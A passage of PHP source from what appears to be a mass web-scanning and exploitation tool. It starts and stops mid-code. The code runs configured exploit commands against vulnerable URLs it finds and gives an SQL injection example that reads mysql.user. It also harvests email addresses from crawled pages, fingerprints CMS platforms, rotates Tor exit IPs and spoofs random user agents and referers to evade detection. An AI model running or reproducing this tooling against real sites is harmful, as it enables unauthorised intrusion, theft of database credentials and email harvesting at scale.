        $final__ = isset($value) && !empty($value) ? explode('::', $final[$value]) : NULL;
        $barra = "{$_SESSION["c1"]}[ INFO ]|___{$_SESSION["c0"]}\n";
        $barra.= "      {$_SESSION["c1"]}|";
        print !is_null($final__) ? "\n{$barra}[ EXPLOIT ]:: {$final__[0]} /[ ID ]:: {$value} /[ COMMAND ]:: " . $final__[1] : NULL;
        echo "\n      ------------------------------------------------------------------------------------------------------------------";
        print !is_null($final__) ? __command($final__[1], $alvo) : NULL;
        __plus();
    }
}

################################################################################
#LIST COMMANDS FILE exploits.conf###############################################
################################################################################

function __configExploitsList($op = NULL) {

    $resultadoURL = array_unique(array_filter(explode("\n", file_get_contents($_SESSION['config']['file_exploit_conf']))));

    if (!is_null($op)) {
        echo __bannerlogo();
        echo $_SESSION["c11"];
        echo "[*]__\n";
        echo "     |MENU EXPLOITS:";
        echo "\n     |ID TYPE_EXPLOIT::EXPLOIT_COMMAND";
        echo "\n     |FILE CONFIG: {$_SESSION['config']['file_exploit_conf']}";
        echo "\n     |USE COMMAND EX: --exploit-id '1,2,3,19'";
        echo "\n-----------------------------------------------------------------------------------------------------------------------\n";
        print_r($resultadoURL);
        __getOut("{$_SESSION['config']['line']}\n");
    } else {
        return is_array($resultadoURL) ? $resultadoURL : NULL;
    }
}

################################################################################
#INSERT VALUES COMMANDS FILE exploits.conf######################################
################################################################################

function __configExploitsADD($valor = NULL) {

    if (!is_null($valor) && preg_match("(([a-zA-Z0-9-].*)(::.*)([a-zA-Z0-9-]))", $valor)) {
        echo __bannerlogo();
        echo $_SESSION["c11"];
        echo "[*]__\n";
        echo "     |MENU EXPLOITS:";
        echo "\n     |ID TYPE_EXPLOIT::EXPLOIT_COMMAND";
        echo "\n     |STATUS: ADDED VALUE WITH SUCCESS!";
        echo "\n     |VALUE: {$valor}";
        echo "\n-----------------------------------------------------------------------------------------------------------------------\n";
        __saveValue($_SESSION['config']['file_exploit_conf'], __crypt($valor), 2);
        print_r(__configExploitsList());
        __getOut("{$_SESSION['config']['line']}\n");
    } else {

        __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}INCORRECT FORMAT! / Format TYPE_EXPLOIT::EXPLOIT_COMMAND / ex: NMAP::nmap -sV _TARGET_\n");
    }
}

################################################################################
#CHECK CMS######################################################################
################################################################################

function __SimpleCheckCMS($html) {

    $cms['XOOPS CMS IDENTIFIED'] = '<meta name="generator" content="Bluefish 2.2.6" ';
    $cms['Joomla CMS IDENTIFIED'] = '<meta name="generator" content="Bluefish 2.2.6" generator" content="WordPress';
    $cms['SMF CMS IDENTIFIED-1'] = '<a href="http://www.simplemachines.org/" title="Simple Machines Forum" target="_blank">Powered by SMF';
    $cms['SMF CMS IDENTIFIED-2'] = '<a href="http://www.simplemachines.org/about/copyright.php" title="Free Forum Software" target="_blank">SMF';
    $cms['vBulletin CMS IDENTIFIED-1'] = '<meta name="generator" content="Bluefish 2.2.6" http://www.vbulletin.com" id="vbulletinlink">vBulletin&trade;</a> Version';
    $cms['vBulletin CMS IDENTIFIED-3'] = 'powered by vBulletin';
    $cms['phpBB CMS IDENTIFIED'] = 'Powered by <a href="http://www.phpbb.com/">phpBB</a>';
    $cms['MyBB CMS IDENTIFIED'] = 'Powered By <a href="http://www.mybboard.net" target="_blank">MyBB</a>';
    $cms['Drupal CMS IDENTIFIED-1'] = 'name="Generator" content="Drupal';
    $cms['Drupal CMS IDENTIFIED-2'] = 'Drupal.settings';
    $cms['MODx CMS IDENTIFIED'] = '<a href="http://www.modx.com" target="_blank"> Powered by MODx</a>';
    $cms['SilverStripe CMS IDENTIFIED'] = '<meta name="generator" content="Bluefish 2.2.6" />';
    $cms['Textpattern CMS IDENTIFIED'] = 'Powered by <a href="http://www.textpattern.com" title="Textpattern">Textpattern</a>';
    $cms['Adapt CMS IDENTIFIED'] = 'Powered by <a href="http://www.adaptcms.com">AdaptCMS';
    $cms['ATutor CMS IDENTIFIED'] = '<a href="/about.php">About ATutor</a>';
    $cms['b2evolution CMS IDENTIFIED'] = '<meta name="generator" content="Bluefish 2.2.6" http://moodle.org" title="Moodle">Moodle</a>';
    $cms['Moodle CMS IDENTIFIED-2 '] = '<meta name="key words" content="moodle, Course Management System " />';
    $cms['Moodle CMS IDENTIFIED-3'] = '://moodle';
    $cms['Moodle CMS IDENTIFIED-4'] = '://www.mood le';
    $cms['ATutor CMS IDENTIFIED'] = '<meta name="generator" content="Bluefish 2.2.6" generator" content="PostNuke';
    $cms['CloudFlare IDENTIFIED-1'] = '<a href="http://www.cloudflare.com/" target="_blank" style=';
    $cms['CloudFlare IDENTIFIED-2'] = 'DDoS protection by CloudFlare</a>';

    foreach ($cms as $campo => $valor) {

        __plus();
        if (strstr($html, $cms[$campo])) {
            return(" {$campo} ");
        }
    }
    return "0xUNIDENTIFIED";
}

################################################################################
#REPLACE THE SECURITIES URL#####################################################
################################################################################

function __replace($exploit, $url) {

    $exploit_ = strstr($_SESSION['config']['replace'], '[INURL]') ?
            $exploit :
            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
    $exploit = explode("[INURL]", $exploit_);
    $exploit[0] = (isset($exploit[0]) && !is_null($exploit[0])) ?
            $exploit[0] :
            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
    $exploit[1] = (isset($exploit[0]) && !is_null($exploit[1])) ?
            $exploit[1] :
            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}DEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}\n");
    return str_replace($exploit[0], $exploit[1], $url);
}

################################################################################
#REMOVE VALUE URL###############################################################
################################################################################

function __remove($value, $url) {

    return str_replace($value, NULL, $url);
}

################################################################################
#VALID MENU OPTIONS#############################################################
################################################################################

function __validateOptions($opArray, $validar, $op = NULL) {

    if (empty($validar) || empty($opArray)) {
        return FALSE;
    }

    $array = explode(',', $opArray);
    if (is_null($op)) {
        $busca = explode(',', $validar);
        for ($i = 0; $i <= count($busca); $i++) {
            if (in_array($busca[$i], $array)) {
                return TRUE;
            }
        }
    } else {
        for ($i = 0; $i <= count($array); $i++) {
            if (strstr($validar, $array[$i])) {
                return TRUE;
            }
        }
    }
    return FALSE;
}

################################################################################
#VALIDATE OPERATING SYSTEM AND COLOR SYSTEM#####################################
################################################################################

function __OS() {

    $sistema = strtoupper(PHP_OS);
    if (substr($sistema, 0, 3) == "WIN") {
        $i = 0;
        //system("cls");
        $_SESSION["os"] = 1;
        while ($i <= 17) {
            $_SESSION["c{$i}"] = NULL;
            $i++;
        }
    } else {
        //system("command clear");
        //DEFINING COLORS
        $_SESSION["c0"] = "\033[0m";      // END OF COLOR
        $_SESSION["c1"] = "\033[1;37m";   // WHITE
        $_SESSION["c2"] = "\033[1;33m";   // YELLOW
        $_SESSION["c3"] = "\033[1;31m";   // RED LIGHT
        $_SESSION["c4"] = "\033[32m";   // GREEN 
        $_SESSION["c5"] = "\033[1;32m";   // GREEN LIGHT
        $_SESSION["c6"] = "\033[0;35m";   // PURPLE
        $_SESSION["c7"] = "\033[1;30m";   // DARK GREY
        $_SESSION["c8"] = "\033[0;34m";   // BLUE
        $_SESSION["c9"] = "\033[0;37m";   // LIGHT GREY
        $_SESSION["c10"] = "\033[0;33m";  // BROWN
        $_SESSION["c11"] = "\033[1;35m";  // LIGHT PURPLE
        $_SESSION["c12"] = "\033[0;31m";  // RED
        $_SESSION["c13"] = "\033[1;36m";  // LIGHT CYAN
        $_SESSION["c14"] = "\033[0;36m";  // CIANO
        $_SESSION["c15"] = "\033[1;34m";  // LIGHT BLUE
        $_SESSION["c16"] = "\033[02;31m"; // DARK RED
    }
}

################################################################################
#SAVE URL VULNERABLE  COMMAND ECHO >> FILE######################################
################################################################################

function __saveValue($arquivo, $valor, $op = NULL) {

    $path = !not_isnull_empty($_SESSION['config']['save-as']) ? $_SESSION['config']['out_put_paste'] : NULL;
    echo ($op == 1) ?
            "\n{$_SESSION["c1"]}|_[ + ]{$_SESSION["c7"]} VALUE SAVED IN THE FILE::{$_SESSION["c9"]} {$arquivo}{$_SESSION["c0"]}" : NULL;
    file_put_contents(($op == 2) ? $arquivo : $path . $arquivo, "{$valor}\n", FILE_APPEND);
}

################################################################################
#CAPTURE ID KEY TO SEARCH LYCOS MAKE############################################
################################################################################

function __getIdSearchLycos($html) {

    $match = NULL;
    preg_match_all("(val.*)", $html, $match);
    return (str_replace(');', '', str_replace('val(', '', str_replace("'", '', $match[0][4]))));
}

################################################################################
#RENEW IP NETWORK TOR###########################################################
################################################################################

function __renewTOR() {

    system("[ -z 'pidof tor' ] || pidof tor | xargs sudo kill -HUP;");
    $request__ = __request_info('http://dynupdate.no-ip.com/ip.php', $_SESSION["config"]["proxy"]);
    __plus();
    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ IP NETWORK TOR RENEWED ]::: {$_SESSION["c1"]}[ {$request__['corpo'] } ]\n{$_SESSION["c0"]}";
    /* https://pt.wikipedia.org/wiki/Pidof
     * pidof é um utilitário Linux que encontra o ID de um programa em execução.
     * Note que o próprio nome é a junção dos termos pid, que significa identidade
     * de um processo e of que significa de. Portanto pidof quer dizer identidade 
     * de processo de...
     * O equivalente no Solaris é pgrep. pidof firefox-bin O commando acima retorna 
     * o pid do processo que está executando firefox-bin.
     * Pode-se combinar o commando 'pidof' com o commando kill dessa forma:
     * kill -9 $(pidof firefox-bin) pidof é simplesmente uma ligação simbólica 
     * para o programa killall5,que está localizado em /sbin.
     */
}

################################################################################
#This function will validate emails#############################################
################################################################################

function __validateEmail($email) {

    $conta = "^[a-zA-Z0-9\._-]+@";
    $domino = "[a-zA-Z0-9\._-]+.";
    $extensao = "([a-zA-Z]{2,4})$";

    $pattern = $conta . $domino . $extensao;

    return (ereg($pattern, $email)) ? TRUE : FALSE;
}

################################################################################
#This function will validate URLS###############################################
################################################################################

function __validateURL($url) {

    if (preg_match("#\b(http[s]?://|ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si", $url)) {
        return TRUE;
    } else {
        return FALSE;
    }
}

################################################################################
#This function will filter custom values########################################
################################################################################

function __extractRegCustom($html, $url_) {

    $matches = NULL;
    __plus();
    preg_match_all("#\b{$_SESSION['config']['regexp-filter']}#i", $html, $matches);

    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]} |_[ URL ] {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";

    $matches_ = array_filter(array_unique(array_unique($matches[0])));
    foreach ($matches_ as $valor) {

        if (not_isnull_empty($valor)) {

            echo "{$_SESSION["c1"]}__[ + ] {$_SESSION["c0"]}[\033[01;31m {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]- {$valor}\n";
            $_SESSION["config"]["resultado_valores"].="{$valor}\n";
            __plus();
            __saveValue($_SESSION["config"]["arquivo_output"], $valor);
            $_SESSION['config']['cont_valores'] ++;
        }
        __plus();
    }
    __timeSec('delay', "\n");
}

################################################################################
#This function will filter and mail each url####################################
################################################################################

function __filterEmailif($resultados) {

    if (is_array($resultados)) {
        echo "{$_SESSION["c1"]}|_[ ! ][ INFO ]{$_SESSION["c16"]}[ FILTERING VALUE ]::{$_SESSION["c1"]}[ {$_SESSION["config"]['ifemail']} ]{$_SESSION["c0"]}\n";
        foreach ($resultados as $value) {

            $temp[] = (strstr($value, $_SESSION['config']['ifemail']) ? $value : NULL);
        }

        return array_unique(array_filter($temp));
    }

    RETURN FALSE;
}

################################################################################
#This function extract emails###################################################
################################################################################

function __extractEmail($html, $url_) {

    $matches = NULL;
    __plus();
    preg_match_all('/([\w\d\.\-\_]+)@([\w\d\.\_\-]+)/mi', $html, $matches);
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]}|_[ ! ][ INFO ][URL] :: {$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";

    $_matches = array_filter(array_unique(array_unique($matches[0])));
    $matches_ = (not_isnull_empty($_SESSION['config']['ifemail']) ? __filterEmailif($_matches) : $_matches);

    foreach ($matches_ as $valor) {

        if (__validateEmail($valor)) {

            echo "{$_SESSION["c1"]}|_[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]- {$valor} "
            . (filter_var($valor, FILTER_VALIDATE_EMAIL) ?
                    "{$_SESSION["c14"]}[ OK ]{$_SESSION["c0"]}" : "{$_SESSION["c16"]}[ NO ]{$_SESSION["c0"]}") . "\n";
            (filter_var($valor, FILTER_VALIDATE_EMAIL) ? $_SESSION["config"]["resultado_valores"].="{$valor}\n" : NULL);
            __plus();
            (filter_var($valor, FILTER_VALIDATE_EMAIL) ? __saveValue($_SESSION["config"]["arquivo_output"], $valor) : NULL);

            $_SESSION['config']['cont_valores'] ++;
        }
        __plus();
    }
    __timeSec('delay', "\n");
}

################################################################################
#This function will filter urls each url########################################
################################################################################

function __extractURLs($html, $url_) {

    $matches = NULL;
    __plus();
    $reg_tag = 'href=\"|src=\"|value=\"';
    $reg = "#\b({$reg_tag}http[s]?://|{$reg_tag}ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si";
    preg_match_all($reg, $html, $matches);
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]} |_[ INFO ][URL] {$_SESSION["c0"]}=>{$_SESSION["c9"]} {$url_} {$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
    $matches_ = array_unique(array_filter($matches[0]));
    $blacklist = $_SESSION["config"]['blacklist'];
    $blacklist_ = (isset($_SESSION["config"]["webcache"])) ? str_replace('webcache.,', '', $blacklist) : $blacklist;

    foreach ($matches_ as $valor) {

        $valor = __filterURLTAG($valor);
        if (__validateURL($valor) && !__validateOptions($blacklist_, $valor, 1)) {
            echo "{$_SESSION["c1"]}__[ + ]{$_SESSION["c0"]}[\033[01;31m {$_SESSION["config"]['cont_url']}"
            . " {$_SESSION["c9"]}]- {$valor}{$_SESSION["c0"]}\n";
            $_SESSION["config"]["resultado_valores"].="{$valor}\n";
            __plus();
            __saveValue($_SESSION["config"]["arquivo_output"], $valor) . __plus();
            $_SESSION["config"]["cont_url"] ++;
        }
        __plus();
    }
    __timeSec('delay', "\n");
}

################################################################################
#This function removes the last regular expression ta###########################
################################################################################

function __filterURLTAG($valor = NULL) {

    return(!is_null($valor)) ? str_replace('"', '', str_replace('href="', '', str_replace('src="', '', str_replace('value="', '', $valor)))) : NULL;
}

################################################################################
#Esta função irá formatar salvar urls concatenadas##############################
################################################################################

function __checkURLs($resultado, $url_) {

    __plus();
    $code = !is_null($_SESSION["config"]["ifcode"]) ? $_SESSION["config"]["ifcode"] : 200;
    $valor = ($resultado['server']['http_code'] == $code) ? "{$_SESSION["c4"]}" : NULL;

    echo "\n{$_SESSION["c1"]}  |_[ INFO ]{$_SESSION["c0"]}[{$_SESSION["c1"]} {$_SESSION['config']['cont_valores']} {$_SESSION["c0"]}]\n";
    echo "{$_SESSION["c1"]}  |_[ INFO ][URL] {$_SESSION["c0"]}::{$_SESSION["c9"]}{$valor} {$url_} {$_SESSION["c0"]}\n";
    echo "{$_SESSION["c1"]}  |_[ INFO ][STATUS]::{$valor} {$resultado['server']['http_code']} {$_SESSION["c0"]}\n";

    __timeSec('delay');
    echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}";
    __plus();

    $target_ = array('url_clean' => $url_, 'url_xpl' => $url_);

    if ($resultado == $code) {

        $_SESSION['config']['resultado_valores'].= "{$url_}\n";
        __saveValue($_SESSION["config"]["arquivo_output"], $url_) . __plus();
        __plus();

        (not_isnull_empty($_SESSION['config']['sub-file']) &&
                is_array($_SESSION['config']['sub-file']) ? __subExecExploits($target_['url_xpl'], $_SESSION['config']['sub-file']) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['command-vul']) ? __command($_SESSION['config']['command-vul'], $target_) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['exploit-vul-id']) ?
                        __configExploitsExec($_SESSION['config']['exploit-vul-id'], $target_) : NULL);
        __plus();
    }

    (not_isnull_empty($_SESSION['config']['exploit-all-id']) ? __configExploitsExec($_SESSION['config']['exploit-all-id'], $target_) : NULL);
    __plus();

    (not_isnull_empty($_SESSION['config']['command-all']) ? __command($_SESSION['config']['command-all'], $target_) : NULL);
    __plus();

    $_SESSION['config']['cont_valores'] ++;

    __plus();
}

################################################################################
#This function will send the contents of the output buffer (if any)#############
################################################################################

function __plus() {

    ob_flush();
    flush();
}

################################################################################
#FORMATTING POST################################################################
################################################################################

function __convertUrlQuery($query) {

    $queryParts = explode('&', $query);
    $params = array();
    $match = array();
    foreach ($queryParts as $param) {
        $item = explode('=', $param);
        preg_match_all("([a-zA-Z0-9]=(.*))", $param, $match);
        $params[$item[0]] = ($match[1][0]);
    }

    return $params;
}

################################################################################
#OPEN FILE BASE FOR VALIDATION##################################################
################################################################################

function __openFile($arquivo, $op = NULL) {

    if (isset($arquivo) && !empty($arquivo)) {
        $resultadoURL = array_unique(array_filter(explode("\n", file_get_contents($arquivo))));

        if (is_array($resultadoURL)) {

            return ($op == 1 ? $resultadoURL : __process($resultadoURL));
        }
    }
}

################################################################################
#CATCH INFORMATION IP###########################################################
################################################################################

function __infoIP($ip, $op = 0) {

    /*
      [longitude] => 4.9
      [latitude] => 52.3667
      [asn] => AS196752
      [offset] => 2
      [ip] => 46.19.37.0
      [area_code] => 0
      [continent_code] => EU
      [dma_code] => 0
      [timezone] => Europe/Amsterdam
      [country_code] => NL
      [isp] => Tilaa B.V.
      [country] => Netherlands
      [country_code3] => NLD
     */

    preg_match_all('#\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})#si', $ip, $ip);
    if (filter_var($ip[0][0], FILTER_VALIDATE_IP)) {
        if ($op == 0) {
            $request__ = __request_info("http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
            __plus();
            return json_decode($request__['corpo'], TRUE);
        } else {
            $_SESSION['config']['verifica_info'] = NULL;
            $request__ = __request_info("http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
            $return = json_decode($request__['corpo'], TRUE);
            __plus();
            return "{$return['city']} /{$return['country']} - {$return['country_code']} /{$return['continent_code']} , ISP: {$return['isp']}";
        }
    }
}

################################################################################
#CAPTURE URL POSITION IN BROWSER ALEXA / RELEVANCE OF SUCH URL##################
################################################################################

function __positionAlexa($url) {

    $xmlSimple = simplexml_load_file("http://data.alexa.com/data?cli=10&dat=snbamz&url={$url}");
    $resultRank = $xmlSimple->SD[1];
    __plus();
    if ($resultRank) {
        $retornoRank = $resultRank->REACH->attributes()->RANK;
    } else {
        $retornoRank = 0;
    }
    return $retornoRank . __plus();
}

################################################################################
#GENERATE URL REFERENCE random##################################################
################################################################################

function __setURLReferenceRandom() {

    $dominio = array('Adzuna', 'Bixee', 'CareerBuilder', 'Craigslist', 'Dice', 'Eluta.ca', 'Hotjobs', 'JobStreet', 'Incruit', 'Indeed', 'Glassdoor', 'LinkUp', 'Monster', 'Naukri',
        'Yahoo', 'Legal', 'GoogleScholar', 'Lexis', 'Manupatra', 'Quicklaw', 'WestLaw', 'Medical', 'Bing Health', 'Bioinformatic', 'CiteAb', 'EB-eye', 'Entrez', 'mtv', 'ubuntu',
        'GenieKnows', 'GoPubMed', 'Healia', 'Healthline', 'Nextbio', 'PubGene', 'Quertle', 'Searchmedica', 'WebMD', 'News', 'BingNews', 'Daylife', 'GoogleNews', 'aol', 'microsoft',
        'MagPortal', 'Newslookup', 'Nexis', 'Topix', 'Trapit', 'YahooNews', 'People', 'Comfibook', 'Ex.plode', 'InfoSpace', 'PeekYou', 'Spock', 'Spokeo', 'WorldwideHelpers', 'iPhone',
        'Zabasearch', 'ZoomInfo', 'Fizber', 'HotPads', 'Realtor', 'Redfin', 'Rightmove', 'Trulia', 'Zillow', 'Zoopla', 'StuRents', 'globo', 'sbt', 'band', 'cnn', 'blog.inurl.com.br'
    );

    $gTLD = array('aero', 'arpa', 'biz', 'com', 'coop', 'edu', 'gov', 'info', 'int', 'mil', 'museum', 'name', 'net', 'org', 'pro', 'tel');

    $arquivo = array('admin', 'index', 'wp-admin', 'info', 'shop', 'file', 'out', 'open', 'news', 'add', 'profile', 'search', 'open', 'photo', 'insert', 'view');
    $ext = array('exe', 'php', 'asp', 'aspx', 'jsf', 'html', 'htm', 'lua', 'log', 'cgi', 'sh', 'css', 'py', 'sql', 'xml', 'rss');

    $pasta = array('App_Files', 'Assets', 'CFFileServlet', 'CFIDE', 'Communication', 'Computers', 'CoreAdminHome', 'CoreHome', 'Crawler', 'Creator',
        'DECOM', 'Dashboard', 'Drives', 'Dynamic', 'FCKeditor', 'Feedback', 'Files', 'Flash', 'Forms', 'Help', 'ICEcore', 'IO', 'Image', 'JPG', 'getold',
        'JSP', 'KFSI', 'Laguna', 'Login', 'Motors', 'MultiSites', 'NR', 'OCodger', 'RSS', 'Safety', 'Smarty', 'Software', 'Static', 'Stress', 'getfull',
        'Sugarcrm', 'Travel', 'UPLOAD', 'Urussanga', 'UserFiles', '__tpl', '_fckeditor', '_info', '_machine', '_plugins', '_sample', '_samples', 'postmost',
        '_source', '_testcases', 'aaa', 'abelardoluz', 'aberlardoluz', 'aborto', 'about', 'aboutus', 'abuse', 'abusers', 'ac_drives', 'acabamentos', 'mail',
        'academias', 'acao', 'acartpro', 'acatalog', 'acc', 'acc_auto_del', 'acc_beep_ken', 'acc_beep_time', 'acc_ch_mail', 'acc_fc_prsc', 'accounts', 'validar',
        'acc_html_mark', 'acc_html_rand', 'acc_lan_page', 'acc_pic_html', 'acc_profol', 'acc_soft_link', 'acc_ssd_page', 'acc_syun_ei', 'german', 'intranet', 'old',
        'acc_time_go', 'acc_wbcreator', 'accept', 'accepted', 'acceso', 'access', 'accessibility', 'accessories', 'acciones', 'acclg', 'account', 'paste', 'paste22',
        'acessorios', 'acontece', 'acougueiro', 'acoustic', 'act', 'action', 'activate', 'active', 'activeden', 'activism', 'actualit', 'actuators', 'ad', 'informatica',
        'ad_division', 'ad_rate', 'adapter', 'adapters', 'adaptive', 'adaptivei', 'adatmentes', 'adbanner', 'adblock', 'adboard', 'adclick', 'add-ons', 'add', 'delete',
        'added', 'addon', 'address', 'adduser', 'adfree', 'adhoc', 'adinfo', 'adios_papa', 'adlink', 'adlinks', 'acc_folder_vw', 'acc_syun_su',
    );

    $locais = array('ac', 'ad', 'ae', 'af', 'ag', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'as', 'at', 'au', 'aw', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn',
        'bw', 'by', 'bz', 'ca', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'bo', 'br',
        'ec', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'bs', 'bt',
        'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'bv',
        'kh', 'ki', 'km', 'kn', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mk', 'ml',
        'mm', 'mn', 'mo', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'nb', 'nc', 'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om',
        'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si',
        'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'ss', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tr', 'tt', 'tv',
        'tw', 'tz', 'ua', 'ug', 'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'yu', 'za', 'zm', 'zw', 'ai',
    );
    return "http://www." . strtolower($dominio[rand(0, count($dominio) - 1)]) . ".{$gTLD[rand(0, count($gTLD) - 1)]}.{$locais[rand(0, count($locais) - 1)]}/{$pasta[rand(0, count($pasta) - 1)]}/{$arquivo[rand(0, count($arquivo) - 1)]}.{$ext[rand(0, count($ext) - 1)]}";
}

################################################################################
#GENERATE AGENT BROWSER random##################################################
################################################################################

function __setUserAgentRandom() {

    $agentBrowser = array('Firefox', 'Safari', 'Opera', 'Flock', 'Internet Explorer', 'Seamonkey', 'Tor Browser', 'GNU IceCat', 'CriOS', 'TenFourFox',
        'SeaMonkey', 'B-l-i-t-z-B-O-T', 'Konqueror', 'Mobile', 'Konqueror', 'Netscape', 'Chrome', 'Dragon', 'SeaMonkey', 'Maxthon', 'IBrowse',
        'K-Meleon', 'GoogleBot', 'Konqueror', 'Minimo', 'Googlebot', 'WeltweitimnetzBrowser', 'SuperBot', 'TerrawizBot', 'YodaoBot', 'Wyzo', 'Grail',
        'PycURL', 'Galaxy', 'EnigmaFox', '008', 'ABACHOBot', 'Bimbot', 'Covario IDS', 'iCab', 'KKman', 'Oregano', 'WorldWideWeb', 'Wyzo', 'GNU IceCat',
        'Vimprobable', 'uzbl', 'Slim Browser', 'Flock', 'OmniWeb', 'Rockmelt', 'Shiira', 'Swift', 'Pale Moon', 'Camino', 'Flock', 'Galeon', 'Sylera'
    );

    $agentSistema = array('Windows 3.1', 'Windows 95', 'Windows 98', 'Windows 2000', 'Windows NT', 'Linux 2.4.22-10mdk', 'FreeBSD',
        'Windows XP', 'Windows Vista', 'Redhat Linux', 'Ubuntu', 'Fedora', 'AmigaOS', 'BackTrack Linux', 'iPad', 'BlackBerry', 'Unix',
        'CentOS Linux', 'Debian Linux', 'Macintosh', 'Android', 'iPhone', 'Windows NT 6.1', 'BeOS', 'OS 10.5', 'Nokia', 'Arch Linux',
        'Ark Linux', 'BitLinux', 'Conectiva (Mandriva)', 'CRUX Linux', 'Damn Small Linux', 'DeLi Linux', 'Ubuntu', 'BigLinux', 'Edubuntu',
        'Fluxbuntu', 'Freespire', 'GNewSense', 'Gobuntu', 'gOS', 'Mint Linux', 'Kubuntu', 'Xubuntu', 'ZeVenOS', 'Zebuntu', 'DemoLinux',
        'Dreamlinux', 'DualOS', 'eLearnix', 'Feather Linux', 'Famelix', 'FeniX', 'Gentoo', 'GoboLinux', 'GNUstep', 'Insigne Linux',
        'Kalango', 'KateOS', 'Knoppix', 'Kurumin', 'Dizinha', 'TupiServer', 'Linspire', 'Litrix', 'Mandrake', 'Mandriva', 'MEPIS',
        'Musix GNU Linux', 'Musix-BR', 'OneBase Go', 'openSuSE', 'pQui Linux', 'PCLinuxOS', 'Plaszma OS', 'Puppy Linux', 'QiLinux',
        'Red Hat Linux', 'Red Hat Enterprise Linux', 'CentOS', 'Fedora', 'Resulinux', 'Rxart', 'Sabayon Linux', 'SAM Desktop', 'Satux',
        'Slackware', 'GoblinX', 'Slax', 'Zenwalk', 'SuSE', 'Caixa Mágica', 'HP-UX', 'IRIX', 'OSF/1', 'OS-9', 'POSYS', 'QNX', 'Solaris',
        'OpenSolaris', 'SunOS', 'SCO UNIX', 'Tropix', 'EROS', 'Tru64', 'Digital UNIX', 'Ultrix', 'UniCOS', 'UNIflex', 'Microsoft Xenix',
        'z/OS', 'Xinu', 'Research Unix', 'InfernoOS'
    );

    $locais = array('cs-CZ', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'ar_JO',
